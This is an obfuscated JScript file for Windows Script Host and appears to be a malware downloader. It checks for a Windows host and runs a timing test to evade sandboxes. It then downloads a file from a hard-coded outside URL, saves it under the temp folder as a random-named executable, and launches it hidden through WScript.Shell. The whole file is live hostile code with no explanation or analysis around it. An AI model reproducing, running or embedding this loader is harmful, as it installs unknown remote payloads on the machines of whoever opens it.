var Q = false;
var ga = "CreateObject";
var N0 = function y() {return WScript[ga]("WScript.Shell");}(), oF = 11;
var RE = "MSXML2.XMLHTTP";
var o = 2123213;
var jf = 0;
function s(pp){N0["Run"](pp, jf, jf);};
function t(){return "" + RE;};
function TP(gu, EF){jf = jf * 1; return gu - EF;};
function H(){return ga;};
/*@cc_on
  @if (@_win32 || @_win64)
    Q = true;
  @end
@*/
if (Q)
{
var T = "";
function w(){return 22;};
var X = 0; var N = 0;
function sS()
{
var L = new this["Date"]();
var c = L["getUTCMilliseconds"]();
WScript["Sleep"](w());
var L = new this["Date"]();
var U = L["getUTCMilliseconds"]();
WScript["Sleep"](w());
var L = new this["Date"]();
var vN = L["getUTCMilliseconds"]();
var X = "Mn";
X = TP(U, c);
var N = "EV";
N = TP(vN, U);
T = "open";
return TP(X, N);
}
var Ma = false;
var fd = false;
for (var Lz = jf; Lz < w() * 1; Lz++){if (sS() != jf){
Ma = true; 
N = "31" + 11 * X + N; 
fd = true; 
break;
}}
function S() {return ((Ma == true) && (Ma == fd)) ? 1 : jf;};
if (Ma && S() && fd){
function tW() {return N0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "pFZ27DT9kQr3UH.exe";};
 bP = t();
 j = WScript[ga](bP);
 var cw = 1;
 while (cw){
try {
j[T]("GET", "http://aztechnologies.co.uk/sdj3oa", false);
j["send"]();
yh = "Sleep";
for (;;){WScript[yh](w() * 11); if (j["readystate"] >= 2 * 2) break;};
cw = jf;
} catch(Mr){};
}
function h(i) {var Cc = (1, 2, 3, 4, 5, i); return Cc;};
hP = WScript[H()]("ADODB.Stream");
bP = hP;
bP[T]();
bP["type"] = h(1);
bP["write"](j["ResponseBody"]);
hP["position"] = h(jf);
bP["Save" + "ToFile"](tW(), 2);
hP["c"+"lose"]();
IA = tW();
s(IA);
}
}

